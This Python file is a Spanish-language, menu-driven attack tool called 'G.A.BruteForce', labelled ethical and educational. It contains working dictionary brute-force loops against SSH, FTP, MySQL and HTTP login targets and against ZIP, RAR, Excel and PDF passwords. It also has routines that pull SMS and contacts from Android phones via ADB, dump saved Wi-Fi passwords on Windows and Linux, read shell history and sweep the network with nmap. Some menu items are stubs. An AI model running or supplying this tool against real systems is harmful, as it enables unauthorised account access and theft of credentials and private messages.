import os
import subprocess
from colorama import Fore, Style, init
import zipfile
import ftplib

init(autoreset=True)

def limpiar_pantalla():
    os.system('cls' if os.name == 'nt' else 'clear')

def mostrar_banner():
    print(Fore.RED + Style.BRIGHT + r"""
   .--.             █████████████████████████████████████████
  |o_o |            ███ G.A.BruteForce - Ético y Educativo ███
  |:_/ |            █████████████████████████████████████████
 //   \ \           💣 Pruebas controladas de autenticación
(|     | )          👨‍💻 Desarrollado por Aaron G - Estudiante
/'\_   _/`\          📱 Android, archivos, servicios locales
\___)=(___/
""")

def fuerza_bruta_zip():
    archivo = input("📁 Ruta del archivo ZIP: ")
    diccionario = input("📄 Ruta del diccionario de contraseñas: ")
    try:
        with zipfile.ZipFile(archivo) as zf:
            with open(diccionario, 'r') as f:
                for clave in f:
                    clave = clave.strip().encode('utf-8')
                    try:
                        zf.extractall(pwd=clave)
                        print(f"[✔] Contraseña encontrada: {clave.decode()}")
                        return
                    except:
                        print(f"[-] Falló: {clave.decode()}")
        print("[✘] No se encontró la contraseña.")
    except Exception as e:
        print(f"❌ Error al abrir el archivo ZIP: {e}")

def fuerza_bruta_ssh():
    try:
        import paramiko
    except ImportError:
        print("❌ Falta 'paramiko'. Instálalo con: python3 -m pip install paramiko")
        return
    host = input("🔐 IP del servidor SSH: ")
    usuario = input("👤 Usuario: ")
    diccionario = input("📄 Diccionario: ")
    with open(diccionario, 'r') as f:
        for clave in f:
            clave = clave.strip()
            try:
                cliente = paramiko.SSHClient()
                cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                cliente.connect(host, username=usuario, password=clave, timeout=3)
                print(f"[✔] Contraseña encontrada: {clave}")
                cliente.close()
                return
            except:
                print(f"[-] Falló: {clave}")
    print("[✘] No se encontró la contraseña.")

def fuerza_bruta_ftp():
    host = input("🔐 IP del servidor FTP: ")
    usuario = input("👤 Usuario: ")
    diccionario = input("📄 Diccionario: ")
    with open(diccionario, 'r') as f:
        for clave in f:
            clave = clave.strip()
            try:
                ftp = ftplib.FTP(host)
                ftp.login(user=usuario, passwd=clave)
                print(f"[✔] Contraseña encontrada: {clave}")
                ftp.quit()
                return
            except:
                print(f"[-] Falló: {clave}")
    print("[✘] No se encontró la contraseña.")

def fuerza_bruta_rar():
    try:
        import rarfile
    except ImportError:
        print("❌ Falta 'rarfile'. Instálalo con: python3 -m pip install rarfile")
        print("ℹ️ Además instala 'unrar' o 'unar' en el sistema (ej: sudo apt install unrar).")
        return
    archivo = input("📁 Archivo RAR: ")
    diccionario = input("📄 Diccionario: ")
    rf = rarfile.RarFile(archivo)
    with open(diccionario, 'r') as f:
        for clave in f:
            clave = clave.strip()
            try:
                rf.extractall(pwd=clave)
                print(f"[✔] Contraseña encontrada: {clave}")
                return
            except:
                print(f"[-] Falló: {clave}")
    print("[✘] No se encontró la contraseña.")

def fuerza_bruta_mysql():
    try:
        import mysql.connector
    except ImportError:
        print("❌ Falta 'mysql-connector-python'. Instálalo con: python3 -m pip install mysql-connector-python")
        return
    host = input("🔐 IP MySQL: ")
    usuario = input("👤 Usuario: ")
    diccionario = input("📄 Diccionario: ")
    with open(diccionario, 'r') as f:
        for clave in f:
            clave = clave.strip()
            try:
                mysql.connector.connect(host=host, user=usuario, password=clave)
                print(f"[✔] Contraseña encontrada: {clave}")
                return
            except:
                print(f"[-] Falló: {clave}")
    print("[✘] No se encontró la contraseña.")

def fuerza_bruta_http():
    try:
        import requests
    except ImportError:
        print("❌ Falta 'requests'. Instálalo con: python3 -m pip install requests")
        return
    url = input("🌐 URL del login: ")
    usuario = input("👤 Usuario: ")
    diccionario = input("📄 Diccionario: ")
    with open(diccionario, 'r') as f:
        for clave in f:
            clave = clave.strip()
            datos = {'username': usuario, 'password': clave}
            r = requests.post(url, data=datos)
            if "incorrect" not in r.text.lower():
                print(f"[✔] Contraseña encontrada: {clave}")
                return
            else:
                print(f"[-] Falló: {clave}")
    print("[✘] No se encontró la contraseña.")

def fuerza_bruta_excel():
    try:
        import msoffcrypto
    except ImportError:
        print("❌ Falta 'msoffcrypto-tool'. Instálalo con: python3 -m pip install msoffcrypto-tool")
        return
    archivo = input("📁 Archivo Excel: ")
    diccionario = input("📄 Diccionario: ")
    with open(diccionario, 'r') as f:
        for clave in f:
            clave = clave.strip()
            try:
                file = open(archivo, 'rb')
                office_file = msoffcrypto.OfficeFile(file)
                office_file.load_key(password=clave)
                office_file.decrypt(open("excel_desbloqueado.xlsx", "wb"))
                print(f"[✔] Contraseña encontrada: {clave}")
                return
            except:
                print(f"[-] Falló: {clave}")
    print("[✘] No se encontró la contraseña.")

def fuerza_bruta_pdf():
    try:
        import PyPDF2
    except ImportError:
        print("❌ Falta 'PyPDF2'. Instálalo con: python3 -m pip install PyPDF2")
        return
    archivo = input("📁 Archivo PDF: ")
    diccionario = input("📄 Diccionario: ")
    with open(diccionario, 'r') as f:
        reader = PyPDF2.PdfReader(archivo)
        for clave in f:
            clave = clave.strip()
            if reader.decrypt(clave):
                print(f"[✔] Contraseña encontrada: {clave}")
                return
            else:
                print(f"[-] Falló: {clave}")
    print("[✘] No se encontró la contraseña.")

def fuerza_bruta_pin_android():
    print("🔐 Este módulo requiere acceso físico y ADB root.")
    print("⚠️ Simulado: no se puede extraer PIN sin root y acceso físico.")

def extraer_sms_android():
    print("📩 Extrayendo SMS...")
    print(subprocess.getoutput("adb shell content query --uri content://sms"))

def extraer_contactos_android():
    print("👥 Extrayendo contactos...")
    print(subprocess.getoutput("adb shell content query --uri content://contacts/phones"))

def ver_procesos_windows():
    print("🧠 Procesos activos:")
    print(subprocess.getoutput("tasklist"))

def ver_servicios_linux():
    print("🔧 Servicios activos:")
    print(subprocess.getoutput("systemctl list-units --type=service --state=running"))

def ver_sniffers():
    print("🔎 Interfaces en modo promiscuo:")
    print(subprocess.getoutput("ip link | grep PROMISC"))

def ver_wifi_linux():
    print("🔐 Claves Wi-Fi guardadas:")
    print(subprocess.getoutput("sudo cat /etc/NetworkManager/system-connections/* | grep psk="))

def ver_historial_comandos():
    print(subprocess.getoutput("tail -n 20 ~/.bash_history"))

def ver_usb_conectados():
    print(subprocess.getoutput("lsusb"))

def ver_archivos_modificados():
    print(subprocess.getoutput("find /etc -type f -mtime -1"))

def ver_tareas_programadas():
    print(subprocess.getoutput("crontab -l"))

def ver_conexiones_salientes():
    print(subprocess.getoutput("ss -tunap | grep ESTAB"))

def ver_logs_grandes():
    print(subprocess.getoutput("find /var/log -type f -size +5M"))

def ver_sudo_logs():
    print(subprocess.getoutput("grep 'sudo' /var/log/auth.log | tail -n 10"))

def listar_apps_android():
    print("📱 Listando apps instaladas en Android...")
    resultado = subprocess.getoutput("adb shell pm list packages")
    print(resultado)

def ver_wifi_windows():
    print("🔐 Redes Wi-Fi guardadas y contraseñas:")
    perfiles = subprocess.getoutput("netsh wlan show profiles")
    for linea in perfiles.split('\n'):
        if "Perfil de todos los usuarios" in linea or "All User Profile" in linea:
            nombre = linea.split(":")[1].strip()
            clave = subprocess.getoutput(f"netsh wlan show profile name=\"{nombre}\" key=clear")
            for l in clave.split('\n'):
                if "Contenido de la clave" in l or "Key Content" in l:
                    print(f"📶 {nombre}: {l.split(':')[1].strip()}")

def escanear_red_local():
    red = input("🌐 Ingresá el rango de red (ej: 192.168.1.0/24): ")
    print("🔎 Escaneando red...")
    resultado = subprocess.getoutput(f"nmap -sn {red}")
    print(resultado)

def ejecutar_modulo(nombre, numero):
    print(f"\n[+] Ejecutando módulo: {nombre}")
    if numero == 1:
        fuerza_bruta_ssh()
    elif numero == 2:
        fuerza_bruta_ftp()
    elif numero == 3:
        fuerza_bruta_zip()
    elif numero == 4:
        fuerza_bruta_rar()
    elif numero == 5:
        fuerza_bruta_mysql()
    elif numero == 6:
        fuerza_bruta_http()
    elif numero == 7:
        fuerza_bruta_excel()
    elif numero == 8:
        fuerza_bruta_pdf()
    elif numero == 9:
        print(f"[✔] Módulo '{nombre}' ejecutado (simulado)")
    elif numero == 10:
        print(f"[✔] Módulo '{nombre}' ejecutado (simulado)")
    elif numero == 11:
        print(f"[✔] Módulo '{nombre}' ejecutado (simulado)")
    elif numero == 12:
        fuerza_bruta_pin_android()
    elif numero == 13:
        listar_apps_android()
    elif numero == 14:
        extraer_sms_android()
    elif numero == 15:
        extraer_contactos_android()
    elif numero == 16:
        print(f"[✔] Módulo '{nombre}' ejecutado (simulado)")
    elif numero == 17:
        ver_wifi_windows()
    elif numero == 18:
        ver_procesos_windows()
    elif numero == 19:
        ver_servicios_linux()
    elif numero == 20:
        print(f"[✔] Módulo '{nombre}' ejecutado (simulado)")
    elif numero == 21:
        ver_historial_comandos()
    elif numero == 22:
        ver_usb_conectados()
    elif numero == 23:
        ver_archivos_modificados()
    elif numero == 24:
        escanear_red_local()
    elif numero == 25:
        ver_sudo_logs()
    elif numero == 26:
        ver_wifi_linux()
    elif numero == 27:
        ver_tareas_programadas()
    elif numero == 28:
        ver_conexiones_salientes()
    elif numero == 29:
        ver_logs_grandes()
    elif numero == 30:
        ver_sniffers()
    else:
        print(f"[✔] Módulo '{nombre}' ejecutado (simulado)")

def mostrar_menu():
    opciones = [
        "Fuerza bruta SSH local", "Fuerza bruta FTP local",
        "Fuerza bruta ZIP", "Fuerza bruta RAR",
        "Fuerza bruta MySQL local", "Fuerza bruta HTTP Login local",
        "Fuerza bruta a archivo Excel", "Fuerza bruta a PDF protegido",
        "Fuerza bruta a archivo DOCX", "Fuerza bruta a archivo 7z",
        "Fuerza bruta a red Wi-Fi propia", "Fuerza bruta a PIN de Android (USB)",
        "Listar apps instaladas en Android", "Extraer SMS de Android (USB)",
        "Extraer contactos de Android (USB)", "Ver claves guardadas en navegador local",
        "Ver contraseñas Wi-Fi guardadas (Windows)", "Ver procesos sospechosos en Windows",
        "Ver servicios activos en Linux", "Ver resumen de intentos fallidos",
        "Ver historial de comandos usados", "Ver dispositivos USB conectados",
        "Ver archivos modificados recientemente", "Escanear red local y mostrar IPs activas",
        "Ver intentos de sudo recientes", "Ver claves de red Wi-Fi en Linux",
        "Ver tareas programadas (cron o Windows)", "Ver conexiones salientes por puerto",
        "Ver archivos .log grandes", "Ver si hay sniffers activos"
    ]

    while True:
        print(Fore.CYAN + "\n📋 MENÚ DE OPCIONES:")
        for i in range(0, len(opciones), 2):
            col1 = f"[{i+1}] {opciones[i]}"
            col2 = f"[{i+2}] {opciones[i+1]}" if i+1 < len(opciones) else ""
            print(f"{col1.ljust(45)} {col2}")
        print(" [0] Salir")

        eleccion = input("\nSeleccioná una opción (número): ")
        if eleccion == "0":
            print("👋 Cerrando G.A.BruteForce. ¡Seguridad con conciencia!")
            break
        elif eleccion.isdigit() and 1 <= int(eleccion) <= len(opciones):
            ejecutar_modulo(opciones[int(eleccion) - 1], int(eleccion))
        else:
            print("❌ Opción inválida. Probá de nuevo.")

if __name__ == "__main__":
    limpiar_pantalla()
    mostrar_banner()
    mostrar_menu()
